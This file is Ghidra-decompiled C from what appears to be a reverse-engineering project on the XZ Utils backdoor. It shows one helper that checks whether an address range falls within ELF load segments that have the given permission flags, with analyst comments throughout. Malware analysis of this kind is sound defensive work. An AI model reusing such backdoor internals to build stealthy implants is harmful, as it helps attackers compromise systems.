// /home/kali/xzre-ghidra/xzregh/101240_elf_contains_vaddr_impl.c
// Function: elf_contains_vaddr_impl @ 0x101240
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_contains_vaddr_impl(elf_info_t * elf_info, void * vaddr, u64 size, u32 p_flags)


/*
 * AutoDoc: Validates that `[vaddr, vaddr + size)` is entirely covered by one or more PT_LOAD segments whose `p_flags` mask includes the requested bits. The helper page-aligns both ends of the interval, walks every loadable program header, and recursively re-checks any prefix/suffix that straddles adjacent segments until the entire interval is proven resident.
 *
 * It refuses to run more than 0x3ea iterations (preventing runaway recursion), insists that the candidate addresses live inside the mapped ELF image, and short-circuits to TRUE when `size` is zero. Callers pass `p_flags` values such as PF_X or PF_W to differentiate text, data, and RELRO spans.
 */

#include "xzre_types.h"

BOOL elf_contains_vaddr_impl(elf_info_t *elf_info,void *vaddr,u64 size,u32 p_flags)

{
  u8 *range_limit;
  BOOL range_fits;
  Elf64_Phdr *load_segment;
  ulong segment_runtime_start;
  u8 *segment_page_floor;
  u8 *segment_page_ceil;
  ulong phdr_idx;
  int recursion_depth;
  
LAB_00101254:
  recursion_depth = recursion_depth + 1;
  range_limit = (Elf64_Ehdr *)(((Elf64_Ehdr *)vaddr)->e_ident + size);
  if (size == 0) {
LAB_0010138e:
    range_fits = TRUE;
  }
  else {
    segment_page_floor = range_limit;
    if (vaddr <= range_limit) {
      segment_page_floor = (Elf64_Ehdr *)vaddr;
    }
    if ((elf_info->elfbase <= segment_page_floor) && (recursion_depth != 0x3ea)) {
      phdr_idx = 0;
      do {
        if ((uint)(ushort)elf_info->phdr_count <= (uint)phdr_idx) break;
        load_segment = elf_info->phdrs + phdr_idx;
        if ((load_segment->p_type == 1) && ((load_segment->p_flags & p_flags) == p_flags)) {
          segment_runtime_start = (long)elf_info->elfbase + (load_segment->p_vaddr - elf_info->load_base_vaddr);
          segment_page_ceil = (Elf64_Ehdr *)(load_segment->p_memsz + segment_runtime_start);
          // AutoDoc: Align each candidate PT_LOAD window to page boundaries so the comparison never straddles partial pages.
          segment_page_floor = (Elf64_Ehdr *)(segment_runtime_start & 0xfffffffffffff000);
          if (((ulong)segment_page_ceil & 0xfff) != 0) {
            segment_page_ceil = (Elf64_Ehdr *)(((ulong)segment_page_ceil & 0xfffffffffffff000) + 0x1000);
          }
          if ((vaddr >= segment_page_floor) && (range_limit <= segment_page_ceil)) goto LAB_0010138e;
          if ((range_limit > segment_page_ceil) || (segment_page_floor <= vaddr)) {
            if ((segment_page_ceil <= vaddr) || (vaddr < segment_page_floor)) {
              // AutoDoc: Range pierces both edges of this segment—split it into left/right halves and validate them recursively.
              if ((segment_page_ceil < range_limit) && (segment_page_floor > vaddr)) {
                range_fits = elf_contains_vaddr_impl(elf_info,vaddr,(long)segment_page_floor - (long)vaddr,p_flags);
                if (range_fits == FALSE) {
                  return FALSE;
                }
                range_fits = elf_contains_vaddr_impl
                                  (elf_info,segment_page_ceil->e_ident + 1,(long)range_limit + (-1 - (long)segment_page_ceil),
                                   p_flags);
                return (uint)(range_fits != FALSE);
              }
            }
            // AutoDoc: Otherwise advance `vaddr` past the current segment and continue checking the remaining bytes.
            else if (segment_page_ceil < range_limit) {
              vaddr = segment_page_ceil->e_ident + 1;
              size = (long)range_limit - (long)vaddr;
              goto LAB_00101254;
            }
          }
          else if (segment_page_floor < range_limit) goto code_r0x00101313;
        }
        phdr_idx = phdr_idx + 1;
      } while( TRUE );
    }
    range_fits = FALSE;
  }
  return range_fits;
code_r0x00101313:
  size = (long)segment_page_floor + (-1 - (long)vaddr);
  goto LAB_00101254;
}

